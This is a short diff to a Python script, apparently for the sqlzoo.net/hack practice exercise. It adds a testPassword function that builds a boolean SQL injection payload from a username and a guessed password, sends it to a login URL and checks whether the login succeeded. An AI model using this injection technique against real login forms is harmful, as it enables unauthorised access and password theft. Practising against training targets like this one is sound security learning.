@@ -73,6 +73,9 @@ def readQuery(query, username):
       query: String
          html result of a form submission -- from sqlzoo.net/hack
 
+      username: String
+         username of login attempt
+
    Returns: boolean
       true iff login was successful
 
@@ -172,6 +175,12 @@ def testPassword(password, username, url):
 
    """
 
+   payload = "' OR EXISTS(SELECT * FROM users WHERE name= '" + username + "' AND password = '" + password + "') AND ''='"
+
+   r = sendQuery(payload, url)
+
+   return readQuery(r, username);
+
 
 
 
@@ -186,3 +195,5 @@ https://docs.python.org/3/tutorial/controlflow.html#more-on-defining-functions
 
 
 """
+
+
